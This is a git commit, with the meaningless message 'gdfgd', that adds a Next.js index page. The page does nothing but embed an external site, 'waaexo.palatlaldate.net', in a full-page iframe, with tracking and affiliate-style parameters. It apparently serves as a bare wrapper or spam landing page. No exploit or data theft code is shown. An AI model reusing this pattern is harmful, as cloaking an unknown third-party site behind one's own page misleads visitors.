8ca4cde0ad9a72e45d3ca3bc91b124705a7d7374
mylinkfree <119774915+mylinkfree@users.noreply.github.com>
2022-12-09 09:40:57 +0600

    gdfgd

---
+++ pages/index.js
@@ -0,0 +1,17 @@
+import Head from 'next/head'
+import Image from 'next/image'
+import styles from '../styles/Home.module.css'
+import Iframe from 'react-iframe'
+export default function Home() {
+  return (
+    <div >
+      <Iframe url="https://waaexo.palatlaldate.net?utm_source=da57dc555e50572d&s1=177275&s2=1669597&s3=Search&j1=1"
+       
+       
+        id=""
+        className="iframe"
+        display="block"
+        position="relative"/>
+    </div>
+  )
+}
